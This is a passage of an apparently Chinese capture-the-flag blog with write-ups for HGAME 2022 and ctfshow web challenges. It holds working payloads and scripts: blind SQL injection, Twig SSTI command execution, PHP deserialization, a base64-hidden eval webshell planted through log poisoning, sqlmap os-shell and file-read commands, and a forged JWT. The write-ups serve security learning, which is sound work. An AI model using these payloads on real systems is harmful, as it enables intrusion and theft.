&quot;if(ascii(substr((selselectect/*/**/*/group_concat(column_name)frfromom(infoorrmation_schema.columns)whwhereere(table_name/*/**/*/like/*/**/*/&#x27;fllllllllaaaaaag&#x27;)),%d,1))&gt;%d,404,403)&quot; % (i, mid)</span></span><br><span class="line"></span><br><span class="line">        r = requests.get(url + payload)</span><br><span class="line">        <span class="comment">#r.encoding = &quot;utf-8&quot;</span></span><br><span class="line">        <span class="comment"># print(url+payload)</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;404&quot;</span> in r.text:</span><br><span class="line">            head = mid + <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="comment"># print(r.text)</span></span><br><span class="line">            tail = mid</span><br><span class="line"></span><br><span class="line">    last = result</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> head != <span class="number">32</span>:</span><br><span class="line">        result += chr(head)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">print</span>(result)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="web-一本单词书"><a href="#web-一本单词书" class="headerlink" title="web 一本单词书"></a>web 一本单词书</h2><blockquote>
<p>substr(string,start,length)     substr() 函数返回字符串的一部分。<br>strstr() 函数搜索字符串在另一字符串中的第一次出现。<br>strpos() 函数查找字符串在另一字符串中第一次出现的位置。</p>
</blockquote>
<p>看源码，发现<a target="_blank" rel="noopener" href="http://www.zip得压缩包/">www.zip得压缩包</a><br>下载得源码<br>在save.php中发现可以操作session文件<br><img src="https://img-blog.csdnimg.cn/5337af59de4a4effb4cd0550b4e71c58.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAWXVuWDFu,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>在get.php中发现可以进行反序列化<br><img src="https://img-blog.csdnimg.cn/fa09811a461d4b5f87eaf187fe213aa0.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAWXVuWDFu,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>由于数据处理时为json_decode所以键值对的键可控，注入session文件，反序列化读取文件<br>paylaod</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line"><span class="string">&quot;y0ng|O:4:\&quot;Evil\&quot;:2:&#123;s:4:\&quot;file\&quot;;s:5:\&quot;/flag\&quot;;s:4:\&quot;flag\&quot;;N;&#125;&quot;</span>:<span class="number">1</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="web-SecurityCenter"><a href="#web-SecurityCenter" class="headerlink" title="web SecurityCenter"></a>web SecurityCenter</h2><p>看源码，发现<br><img src="https://img-blog.csdnimg.cn/6abe78c323dd475d850362ea85b14b90.png" alt="在这里插入图片描述"><br>进入之后发现是twig框架<br><img src="https://img-blog.csdnimg.cn/430d0333a13f4a8cb57a36010cc7d7d2.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAWXVuWDFu,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>扫目录发现<img src="https://img-blog.csdnimg.cn/b44ce02bf42847e1af810ec398b0cda4.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAWXVuWDFu,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>进入/redirect.php<br>发现存在ssti<br><img src="https://img-blog.csdnimg.cn/64e0d8978422400cbdd8f9a46dc503ae.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAWXVuWDFu,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/7518#toc-0">TWIG 全版本 通用 SSTI payload</a></p>
<p>利用上面得payload<br>得到题解</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?url=&#123;&#123;[<span class="string">&quot;base64+/f*&quot;</span>,%<span class="number">200</span>]|sort(<span class="string">&quot;system&quot;</span>)|join(<span class="string">&quot;,&quot;</span>)&#125;&#125;</span><br></pre></td></tr></table></figure>
<p>直接/f*是无回显得<br>必须前面加上base64编码</p>
<h2 id="web-Vidar-shop-demo"><a href="#web-Vidar-shop-demo" class="headerlink" title="web Vidar shop demo"></a>web Vidar shop demo</h2><p>注册用户然后发现账户有9999元，商店里面flag需要1w<br>应该就是逻辑漏洞或者竞争，点击flag商品和其他一个商品进行下单<br>先把20的支付一下<br>发现之后还可以删除退钱<br>抓包<br>修改uid<br><img src="https://img-blog.csdnimg.cn/0612f31e309b4a78a149094a0003756e.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAWXVuWDFu,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>发现当点击删除时，发起一个对应ID的包，将id改为flag对应id 2637放包发现退还了1w，再次购买flag，成功<br><img src="https://img-blog.csdnimg.cn/29c35cb85bbd4fa5a2a1c981801caa51.png" alt="在这里插入图片描述"></p>
<h2 id="web-LoginMe"><a href="#web-LoginMe" class="headerlink" title="web LoginMe"></a>web LoginMe</h2><p>进入后直接尝试sqlmap发现可以使用<br>直接sqlmap一把梭<br><img src="https://img-blog.csdnimg.cn/34d90f8e73804038a70fc18f6fe9b813.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAWXVuWDFu,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>得到密码登录得到flag</p>
<h2 id="web-Comment"><a href="#web-Comment" class="headerlink" title="web Comment"></a>web Comment</h2><p>打开题目，下载源码，发现<br><img src="https://img-blog.csdnimg.cn/9ac0941e667c4ef282f3c3de0c20314f.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAWXVuWDFu,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>libxml_disable_entity_loader(false); 允许外部实体，waf了一些关键字<br><img src="https://img-blog.csdnimg.cn/377dad0cdbde4c7bad5fd81c8e572d88.png" alt="在这里插入图片描述"><br>可以发现sender必须为admin，但是输入内容却不能有admin<br>尝试利用一百万个字符绕过preg_match，但是没成功<br>之后不会了！！！<br><strong>之后补上</strong></p>
<h2 id="web-Markdown-online"><a href="#web-Markdown-online" class="headerlink" title="web Markdown online"></a>web Markdown online</h2><p>下载附件<br>得到源码<br>看登录控制器<br><img src="https://img-blog.csdnimg.cn/89ddcc913ac34e02b2d7cb5c81f2abb2.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAWXVuWDFu,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>要使password长度为16且=54g<br>由于toUpperCase()函数使得字符都改为大写，则登录条件无法成立<br>但登录处只要让 toUpperCase 抛出异常就可以登陆成功，让password为数组即可使其长度为16绕过</p>
<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="attr">&quot;username&quot;</span>:<span class="string">&quot;admin&quot;</span>,<span class="attr">&quot;password&quot;</span>:[<span class="string">&quot;1&quot;</span>,<span class="string">&quot;1&quot;</span>,<span class="string">&quot;1&quot;</span>,<span class="string">&quot;1&quot;</span>,<span class="string">&quot;1&quot;</span>,<span class="string">&quot;1&quot;</span>,<span class="string">&quot;1&quot;</span>,<span class="string">&quot;1&quot;</span>,<span class="string">&quot;1&quot;</span>,<span class="string">&quot;1&quot;</span>,<span class="string">&quot;1&quot;</span>,<span class="string">&quot;1&quot;</span>,<span class="string">&quot;1&quot;</span>,<span class="string">&quot;1&quot;</span>,<span class="string">&quot;1&quot;</span>,<span class="string">&quot;1&quot;</span>]&#125;</span><br></pre></td></tr></table></figure>
<p>登陆后便不会了【哭笑】<br><a target="_blank" rel="noopener" href="http://www.yongsheng.site/2022/02/17/HGAME%202022%20WEB/#more">第4周题目的大佬博客</a></p>
</div><hr></div><div class="recent-post-item article-container"><a class="article-title" href="/2022/01/15/ctfshow%20%E9%BB%91%E7%9B%92%E6%B5%8B%E8%AF%95/">ctfshow 黑盒测试</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2022-01-15</time><div class="content"><h2 id="黑盒测试简介"><a href="#黑盒测试简介" class="headerlink" title="黑盒测试简介"></a>黑盒测试简介</h2><blockquote>
<p>黑盒测试又称功能测试，是在不了解程序内部结构和内部特性的情况下进行的测试方法，黑盒测试只验证程序是否能按照需求规格说明书的规定正常使用，是否能适当的接收数据并给出适当的输出结果，如错误提示，或正确的界面等。</p>
</blockquote>
<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/l199616j/p/11403666.html">黑盒测试详细简介</a></p>
<h2 id="web380"><a href="#web380" class="headerlink" title="web380"></a>web380</h2><p>打开后发现是一个网站，之后扫一下目录发现page.php下有东西打开<br>看到<br><img src="https://img-blog.csdnimg.cn/bc45b3f918fe41878e72fad9719a273e.png" alt="在这里插入图片描述"><br>于是payload</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/page.php?id=flag</span><br></pre></td></tr></table></figure>

<h2 id="web381"><a href="#web381" class="headerlink" title="web381"></a>web381</h2><p>看源码发现<br><img src="https://img-blog.csdnimg.cn/06100a50bcd040cfb55a0de607687548.png" alt="在这里插入图片描述"><br>它与其他的有差别，多了个文件夹，访问得到<br><img src="https://img-blog.csdnimg.cn/081e1a8e4d6e4b308ac9c898ffa7adb6.png" alt="在这里插入图片描述"></p>
<h2 id="web382、383"><a href="#web382、383" class="headerlink" title="web382、383"></a>web382、383</h2><p>和上一题一样，在相同的文件下，发现需要账号密码<br><img src="https://img-blog.csdnimg.cn/9cdc27d0198e417bb935e329ef9fbc25.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAWXVuWDFu,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>利用万能密码得到flag</p>
<h2 id="web384"><a href="#web384" class="headerlink" title="web384"></a>web384</h2><p>和上面一样，进入目录后发现万能密码没用<br>看到提示<br><img src="https://img-blog.csdnimg.cn/62e4f12f2f9d4cdb85d55b78ca59e86b.png" alt="在这里插入图片描述"><br>想到爆破<br>利用脚本造出密码字典</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> string</span><br><span class="line">s1=string.ascii_lowercase</span><br><span class="line">s2=string.digits</span><br><span class="line">f=<span class="built_in">open</span>(<span class="string">&#x27;dict.txt&#x27;</span>,<span class="string">&#x27;w&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> s1:</span><br><span class="line">	<span class="keyword">for</span> j <span class="keyword">in</span> s1:</span><br><span class="line">		<span class="keyword">for</span> k <span class="keyword">in</span> s2:</span><br><span class="line">			<span class="keyword">for</span> l <span class="keyword">in</span> s2:</span><br><span class="line">				<span class="keyword">for</span> m <span class="keyword">in</span> s2:</span><br><span class="line">					p=i+j+k+l+m</span><br><span class="line">					f.write(p+<span class="string">&quot;\n&quot;</span>)</span><br><span class="line">f.close()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>于是爆破<br>得到密码  xy123<br>得到flag</p>
<h2 id="web385"><a href="#web385" class="headerlink" title="web385"></a>web385</h2><p>本题先爆一下目录，发现/install目录存在<br>按照提示访问/install/?install<br>之后访问/alsckdfy，进行登录<br>发现账号密码不知道，于是sql注入<br>若是当前无法注入则前往382题注入获取初始账号密码<br>注入后发现密码为<br><img src="https://img-blog.csdnimg.cn/5e0ac41798a74c8c95c46ac9914803ea.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAWXVuWDFu,size_18,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>账号为admin<br>登录得到flag</p>
<h2 id="web386"><a href="#web386" class="headerlink" title="web386"></a>web386</h2><p>看到页面，先用工具扫目录，发现没扫出来，之后看大佬博客，发现具有<br>clear.php和install（扫描工具太菜！！！），通过分析，发现clear.php可以传参参数为file<br>(注意lock.dat在install下)<br>因此进行<br>?file=install/lock.dat<br><img src="https://img-blog.csdnimg.cn/021fb4446af342faade23895fa83ee5b.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAWXVuWDFu,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p>
<p>或者可以在这里发现目录clear.php<br><img src="https://img-blog.csdnimg.cn/89d0af312bd14c14b60a8fffb449c2cf.png" alt="在这里插入图片描述"></p>
<p><img src="https://img-blog.csdnimg.cn/96fa9ad559794b8b887b9fac7b22034a.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAWXVuWDFu,size_20,color_FFFFFF,t_70,g_se,x_16" alt="如图操作"></p>
<p>之后的步骤与上一题一样（访问install…….）</p>
<h2 id="web387"><a href="#web387" class="headerlink" title="web387"></a>web387</h2><p>打开题目，发现上一题思路都不行，之后进行尝试<br>得到<br><img src="https://img-blog.csdnimg.cn/e46e35b377664b25a6c0bd1cee9143c1.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAWXVuWDFu,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>访问/debug得到<br>通过？file传参看日志<br><img src="https://img-blog.csdnimg.cn/188a9c0dbd464c0a899ec4e5653c9860.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAWXVuWDFu,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>发现可以访问，之后试一试一句话放在ua上进行传参，发现没有传参权限<br>看大佬博客，大佬是利用unlink函数将dat文件删掉<br>利用（写在ua中）</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> unlink(<span class="string">&#x27;/var/www/html/install/lock.dat&#x27;</span>)<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>之后访问日志后在访问install得到<br><img src="https://img-blog.csdnimg.cn/8036e79d6634491bba538ff7c22e33cc.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAWXVuWDFu,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>之后同上一样得到flag</p>
<h2 id="web388"><a href="#web388" class="headerlink" title="web388"></a>web388</h2><p>进入题目访问/alsckdfy/editor/<br>发现<br><img src="https://img-blog.csdnimg.cn/e3815dcc9d4d46c2a17e86a7ddb19344.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAWXVuWDFu,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>由于kindEditor编辑4.1.11是存在上传过滤不严的漏洞的，可以上传txt或者zip文件。同时在、debug处存在包含漏洞<br>因此<br>上传文件</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span>=<span class="string">&#x27;metsys&#x27;</span>;</span><br><span class="line"></span><br><span class="line">strrev(<span class="variable">$a</span>)(<span class="string">&#x27;echo PD9waHAgZXZhbCgkX1BPU1RbMV0pOz8+|base64 -d &gt; /var/www/html/1.php&#x27;</span>);</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/4b356e0bba974a83b47ae70e6f26e5d6.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAWXVuWDFu,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>之后在debug处访问<img src="https://img-blog.csdnimg.cn/f98cf8f0c2b14ca7ada556df6833ac58.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAWXVuWDFu,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>访问1.php得到shell<br><img src="https://img-blog.csdnimg.cn/b0a47a327e4545948eeb7106601f2a45.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAWXVuWDFu,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>或用脚本</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">url=<span class="string">&quot;http://fb707431-ebb7-41c8-9ce7-57da16163fec.chall.ctf.show/&quot;</span></span><br><span class="line">url2=<span class="string">&quot;http://fb707431-ebb7-41c8-9ce7-57da16163fec.chall.ctf.show/debug/?file=/var/log/nginx/access.log&quot;</span></span><br><span class="line">cmd=<span class="string">b&quot;&lt;?php eval($_POST[1]);?&gt;&quot;</span></span><br><span class="line">cmd=base64.b64encode(cmd).decode()</span><br><span class="line">headers=&#123;</span><br><span class="line">	<span class="string">&#x27;User-Agent&#x27;</span>:<span class="string">&#x27;&#x27;&#x27;&lt;?php system(&#x27;echo &#123;0&#125;|base64 -d  &gt; /var/www/html/b.php&#x27;);?&gt;&#x27;&#x27;&#x27;</span>.<span class="built_in">format</span>(cmd)</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">print</span>(headers)</span><br><span class="line">requests.get(url=url,headers=headers)</span><br><span class="line">requests.get(url2)</span><br><span class="line"><span class="built_in">print</span>(requests.post(url+<span class="string">&#x27;b.php&#x27;</span>,data=&#123;<span class="string">&#x27;1&#x27;</span>:<span class="string">&#x27;system(&quot;cat alsckdfy/check.php&quot;);&#x27;</span>&#125;).text)</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="web389"><a href="#web389" class="headerlink" title="web389"></a>web389</h2><p>访问/debug发现没权限<br>抓包，发现具有jwt<br>修改jwt，改为admin，密钥为123456<br>将修改后的jwt放入cookie中，发现有权限了<br><img src="https://img-blog.csdnimg.cn/0e385a40fa1e4598a5a7a7b2599bb625.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAWXVuWDFu,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>因此使用脚本（上题用第一种也行）</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">url=<span class="string">&quot;http://4c339478-478a-4112-9297-f8b173856bd3.challenge.ctf.show/&quot;</span></span><br><span class="line">url2=<span class="string">&quot;http://4c339478-478a-4112-9297-f8b173856bd3.challenge.ctf.show/debug/?file=/var/log/nginx/access.log&quot;</span></span><br><span class="line">cmd=<span class="string">b&quot;&lt;?php eval($_POST[1]);?&gt;&quot;</span></span><br><span class="line">cmd=base64.b64encode(cmd).decode()</span><br><span class="line">headers=&#123;</span><br><span class="line">	<span class="string">&#x27;User-Agent&#x27;</span>:<span class="string">&#x27;&#x27;&#x27;&lt;?php system(&#x27;echo &#123;0&#125;|base64 -d  &gt; /var/www/html/b.php&#x27;);?&gt;&#x27;&#x27;&#x27;</span>.<span class="built_in">format</span>(cmd),</span><br><span class="line">	<span class="string">&#x27;Cookie&#x27;</span>:<span class="string">&#x27;auth=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJhZG1pbiIsImlhdCI6MTY0MTk5MzQ3NywiZXhwIjoxNjQyMDAwNjc3LCJuYmYiOjE2NDE5OTM0NzcsInN1YiI6ImFkbWluIiwianRpIjoiZTFhODc1NjdkNmYwM2Y5ZGQxNmZlODY2Nzg3ZDk3NmMifQ._Tsdmo_BZuW_pk7XsGTZO-eZwhCj8tc9v1STILqweoI&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">print</span>(headers)</span><br><span class="line">requests.get(url=url,headers=headers)</span><br><span class="line">requests.get(url2,headers=headers)</span><br><span class="line"><span class="built_in">print</span>(requests.post(url+<span class="string">&#x27;b.php&#x27;</span>,data=&#123;<span class="string">&#x27;1&#x27;</span>:<span class="string">&#x27;system(&quot;cat alsckdfy/check.php&quot;);&#x27;</span>&#125;,headers=headers).text)</span><br></pre></td></tr></table></figure>
<p>得到flag</p>
<h2 id="web390"><a href="#web390" class="headerlink" title="web390"></a>web390</h2><p>本题的page.php页面具有sql注入，利用sqlmap一把梭<br>payload</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u http:<span class="comment">//15f7f758-ad69-4efd-b54e-70b958779879.challenge.ctf.show/page.php?id=1 --file-read /var/www/html/alsckdfy/check.php --batch</span></span><br></pre></td></tr></table></figure>

<p><img src="https://img-blog.csdnimg.cn/a8b0184aa0f5463a8fbf0b5342fe8e06.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAWXVuWDFu,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p>
<h2 id="web391"><a href="#web391" class="headerlink" title="web391"></a>web391</h2><p>本题page.php没有注入点，之后发现搜索框，试了一下，发现有注入点<br>同上<br><img src="https://img-blog.csdnimg.cn/247626191008497fa6fd0e4fc0343307.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAWXVuWDFu,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p>
<h2 id="web392"><a href="#web392" class="headerlink" title="web392"></a>web392</h2><p>和上一题一样，在同一个位置存在sql注入，因此sql一把梭<br>（本题flag在/flag）<br>payload</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u <span class="string">&quot;http://64ef671c-b75d-4b18-9a9c-653012b494eb.challenge.ctf.show/search.php?title=s&quot;</span> --os-shell -batch </span><br></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/e83e33f403ef44b5b1df08c2ebc2e968.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAWXVuWDFu,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p>
<h2 id="web393"><a href="#web393" class="headerlink" title="web393"></a>web393</h2><p>看到题目，用上面的方法，发现无法os 和读文件，因此尝试着爆库，之后发现在库中多出来个link表，看大佬博客，发现在主页面最下方发现过去没见过的搜索引擎<br><img src="https://img-blog.csdnimg.cn/71c1bc8ec57c4c40b61cc8c8614f9098.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAWXVuWDFu,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p>
<p>可以用sqlmap插入数据<br>并利用ssrf将/flag的文件写在数据库中，利用<br>payload</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u <span class="string">&quot;http://b3b129d6-b29a-413a-9bb1-b076712592de.challenge.ctf.show/search.php?title=1&#x27;;insert into link values(10,&#x27;a&#x27;,&#x27;file:///flag&#x27;);&quot;</span> -batch </span><br></pre></td></tr></table></figure>
<p>之后访问/link.php?id=10得到flag<br><img src="https://img-blog.csdnimg.cn/6deba91781224ee3aa20dd9904364077.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAWXVuWDFu,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p>
<h2 id="web394、395"><a href="#web394、395" class="headerlink" title="web394、395"></a>web394、395</h2><p>打开本题，发现上题的思路还能用，因此进行测试，但显现虽然可以插入，但是没有回显，又测试check.php，发现报错。看大佬博客，发现过滤了字符<br>但是可以用16进制绕过，则payload</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u <span class="string">&quot;http://13eceab7-9766-4beb-9ff7-3ccf15085638.challenge.ctf.show/search.php?title=1&#x27;;insert into link values(10,&#x27;a&#x27;,0x66696c653a2f2f2f7661722f7777772f68746d6c2f616c73636b6466792f636865636b2e706870);&quot;</span> -batch</span><br></pre></td></tr></table></figure>
<p>本题的黑名单</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">&#x27;/file|check|php/i&#x27;</span>, <span class="variable">$id</span>))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;error&#x27;</span>);</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>














</div><hr></div><div class="recent-post-item article-container"><a class="article-title" href="/2022/01/10/ctfshow%20XXE/">ctfshow XXE</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2022-01-10</time><div class="content"><p>XXE简介：<br>XXE就是在可以解析XML的地方（比如一个输入框等处）只要可以解析XML语言的代码就可以。在这种地方提交XML的恶意代码来执行。他一般可以做到，内网文件读取，端口扫描，内网程序攻击，任意命令执行等。<br>这边其实XXE是比较少见的，这个漏洞主要也是因为没有对用户输入（用户提交的数据，比如你在输入框输入这个XML恶意代码）并没有合理检测与过滤，将用户提交的数据当XML来执行，造成XXE（XML外部实体注入），最简单的利用方法其实就是用hackbar V2里的XXE选项，他自带了XXE的payload生成功能。直接复制然后放到输入框（可以解析XML代码的地方）就可以了。</p>
<h2 id="web373"><a href="#web373" class="headerlink" title="web373"></a>web373</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2021-01-07 12:59:52</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2021-01-07 13:36:47</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">libxml_disable_entity_loader(<span class="literal">false</span>);</span><br><span class="line"><span class="variable">$xmlfile</span> = file_get_contents(<span class="string">&#x27;php://input&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$xmlfile</span>))&#123;</span><br><span class="line">    <span class="variable">$dom</span> = <span class="keyword">new</span> DOMDocument();</span><br><span class="line">    <span class="variable">$dom</span>-&gt;loadXML(<span class="variable">$xmlfile</span>, LIBXML_NOENT | LIBXML_DTDLOAD);</span><br><span class="line">    <span class="variable">$creds</span> = simplexml_import_dom(<span class="variable">$dom</span>);</span><br><span class="line">    <span class="variable">$ctfshow</span> = <span class="variable">$creds</span>-&gt;ctfshow;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$ctfshow</span>;</span><br><span class="line">&#125;</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);    </span><br><span class="line"></span><br><span class="line"></span><br><span 